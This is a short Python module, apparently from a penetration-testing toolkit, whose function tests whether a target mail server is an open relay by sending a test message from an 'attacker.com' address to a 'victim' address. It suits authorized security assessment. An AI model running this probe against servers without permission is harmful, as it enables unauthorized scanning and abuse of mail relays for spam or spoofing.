"""SMTP exploitation"""

import smtplib
from ..config import DEFAULT_TIMEOUT

def exploit_smtp_open_relay(target, port=25):
    """
    Test for SMTP open relay
    Returns: Result dict or None
    """
    print(f"\n[*] Testing SMTP open relay on {target}:{port}")
    
    try:
        smtp = smtplib.SMTP(target, port, timeout=DEFAULT_TIMEOUT * 2)
        smtp.ehlo()
        
        # Try to send test email
        from_addr = 'test@attacker.com'
        to_addr = 'victim@target.com'
        message = 'Subject: Test\n\nThis is a test email.'
        
        try:
            smtp.sendmail(from_addr, to_addr, message)
            print(f"    [+] SMTP Open Relay detected!")
            
            smtp.quit()
            
            return {
                'service': 'SMTP',
                'port': port,
                'vulnerability': 'Open Relay',
                'status': 'success'
            }
            
        except smtplib.SMTPRecipientsRefused:
            print(f"    [-] Not an open relay")
        
        smtp.quit()
        
    except Exception as e:
        print(f"    [-] Error testing SMTP: {e}")
    
    return None